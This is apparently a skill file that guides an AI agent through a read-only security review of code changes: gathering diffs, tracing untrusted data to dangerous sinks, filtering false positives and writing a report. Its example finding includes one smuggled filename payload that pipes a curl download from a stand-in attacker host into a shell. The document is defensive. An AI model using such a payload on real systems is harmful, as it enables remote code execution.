---
name: security-review
description: Review pending code changes for exploitable security vulnerabilities (injection, auth bypass, unsafe deserialization, secret leaks, XSS, path traversal, SSRF) with a strict false-positive filter. Use for "security review", "is this change safe", "audit this branch/PR for vulnerabilities" before merging.
---

# Security Review of Pending Changes

Goal: find vulnerabilities **introduced by this change** that an attacker could actually
exploit, and report only the ones you are confident about. A short list of real issues
beats a long list of theoretical ones.

The review is read-only. Do not edit files, run exploits against live systems, or send
data anywhere. Reading code and running harmless local commands (grep, git) is enough.

For general correctness bugs use `code-review`; this skill ignores them unless they are
security-relevant.

## 1. Gather the change

```bash
git status --short
base=$(git merge-base HEAD @{upstream} 2>/dev/null || git merge-base HEAD origin/main 2>/dev/null || git merge-base HEAD main)
git log --oneline "$base"..HEAD
git diff --stat "$base"
git diff "$base"
git ls-files --others --exclude-standard   # untracked new files: read them whole
```

If the user named a commit, branch, or path, review that instead. Read large diffs in
chunks from a file - never review a truncated diff.

## 2. Learn the project's security model first

Before judging any line, spend a few searches on context:

- **Entry points for untrusted data:** HTTP handlers, websocket/message handlers, webhooks,
  file uploads, CLI commands exposed to remote users, queue consumers, parsed documents,
  third-party API responses, and output from LLMs that can drive tools.
- **Existing defenses:** auth middleware/decorators, permission checks, ORM or query builder,
  template auto-escaping, path sanitizers, CSRF protection, secret management, sandboxing.
- **Trust boundaries:** which components are internal-only, what runs with elevated
  privileges, multi-tenant separation.

The question for every changed path becomes: *does this change let untrusted data reach a
dangerous operation without passing through the project's existing defense?* Code that
skips a defense its siblings use is a strong signal.

## 3. Trace source -> sink through the diff

For each changed file, follow data from where it enters to where it is used. Sinks worth
checking, by category:

- **Injection:** SQL/NoSQL query strings, shell commands and `subprocess`, `eval`/`exec`,
  template rendering of user strings, XML parsers with external entities, LDAP/XPath.
- **File system:** paths built from input (traversal via `..`, absolute paths, symlinks),
  archive extraction (zip-slip), upload destinations and served file names.
- **AuthN / AuthZ:** routes missing the auth guard, object access without ownership check
  (IDOR), role checks done client-side only, privilege changes, session/JWT handling
  (algorithm `none`, unchecked signature, no expiry), password reset flows.
- **Deserialization / code loading:** `pickle`, `yaml.load` without a safe loader, Java/.NET
  native deserialization, dynamic imports or plugin loading from user-controlled names.
- **Web output:** HTML built by string concatenation, `innerHTML`/`dangerouslySetInnerHTML`,
  `v-html`, `bypassSecurityTrust*`, unsafe markdown rendering; open CORS with credentials.
- **Outbound requests:** URLs where the attacker controls host or scheme (SSRF to internal
  services or cloud metadata).
- **Crypto and secrets:** hardcoded keys/tokens/passwords, weak algorithms for security
  purposes (MD5/SHA1 for passwords, ECB, static IVs), non-cryptographic randomness for
  tokens, disabled TLS certificate verification.
- **Data exposure:** secrets, passwords, or personal data written to logs or returned in
  API responses; verbose error pages or stack traces exposed to clients.
- **Agent/tool execution:** untrusted text (web pages, emails, documents) reaching a model
  whose output can run shell commands, write files, or make requests **without** a
  permission or confirmation gate.

## 4. Filter false positives

Before keeping any candidate, apply the exclusion rules in
[references/false-positive-rules.md](references/false-positive-rules.md). Then score your
confidence that it is a real, exploitable issue from 1 to 10:

- 9-10: clear attack path from attacker-controlled input to impact; you can describe the request.
- 8: well-known vulnerable pattern with input that is plausibly attacker-controlled.
- 7 or below: depends on unverified assumptions - **do not report**.

**Independent check (recommended when you have more than one candidate):** run one
verification per candidate in parallel with `delegate_parallel` using the read-only
`analyst` agent. Give each task: the repo path, the diff command, the candidate
(file, line, claimed issue), the absolute path of the false-positive rules file (this
skill's directory + `references/false-positive-rules.md`), and ask it to try to *refute*
the finding and return a 1-10 confidence with the line that justifies it. Keep only
candidates that remain at 8 or above after both your and the verifier's assessment.

## 5. Report

Output a markdown report and nothing else:

```
# Security review: <target>

## [HIGH] Command injection - src/tools/run.py:57
- Category: command_injection
- Confidence: 9/10
- What: `filename` from the upload form is interpolated into `subprocess.run(..., shell=True)`.
- Exploit: upload a file named `a.txt; curl attacker.sh | sh` -> arbitrary command execution as the server user.
- Fix: pass an argument list without `shell=True`, or validate the name against an allowlist.

## [MEDIUM] ...
```

Severity:
- **HIGH** - directly exploitable: remote code execution, auth bypass, access to other users' data, secret disclosure.
- **MEDIUM** - real impact but needs specific conditions (authenticated attacker, particular config).
- **LOW** - only report if it is concrete and the user asked for exhaustive output.

If nothing survives the filter, write: `No high-confidence vulnerabilities found in this change.`
followed by one or two lines on what was examined (entry points, sinks) so the reader knows
the scope of the check.
